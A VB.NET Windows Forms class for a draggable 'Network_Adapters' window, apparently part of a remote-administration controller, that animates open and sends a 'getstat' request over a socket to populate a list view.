﻿Public Class Network_Adapters
    Public sock As Integer




    Dim Curr As Double = 0.0
#Region "Drag"

    Dim posX As Integer
    Dim posY As Integer
    Dim drag As Boolean



    Private Sub Header_MouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label3.MouseDown
        If e.Button = MouseButtons.Left Then
            drag = True
            posX = Cursor.Position.X - Me.Left
            posY = Cursor.Position.Y - Me.Top
        End If
    End Sub

    Private Sub Header_MouseUp(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label3.MouseUp
        drag = False
    End Sub

    Private Sub Header_MouseMove(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label3.MouseMove
        If drag Then
            Me.Top = Cursor.Position.Y - posY
            Me.Left = Cursor.Position.X - posX
        End If
        Me.Cursor = Cursors.Default
    End Sub


    Private Sub buttonClos_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles buttonClos.Click
        Me.Close()
    End Sub



#End Region

    Private Sub Network_Adapters_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        Me.AllowTransparency = True
        Me.TransparencyKey = Me.BackColor
        Timer1.Start()
    End Sub

    Private Sub Timer1_Tick(sender As System.Object, e As System.EventArgs) Handles Timer1.Tick
        '521
        If Curr < 520 Then
            Curr += 52.1
            Me.Size = New Size(Me.Width, Curr)
        Else
            Timer1.Stop()
            Reforge()
            SendCommand()
        End If
    End Sub
    Sub Reforge() '636 --> 300 --> 318
        Me.Location = New Point(Screen.PrimaryScreen.WorkingArea.Size.Width / 2 - Me.Width / 2, Screen.PrimaryScreen.WorkingArea.Size.Height / 2 - 260)

        Me.Refresh()
    End Sub

    Private Sub SendCommand()
        ListView1.Items.Clear()

        Main.S.Send(sock, "getstat")
    End Sub
    Private Sub RefreshNetworkInformationToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RefreshNetworkInformationToolStripMenuItem.Click
        ListView1.Items.Clear()

        Main.S.Send(sock, "getstat")
    End Sub
End Class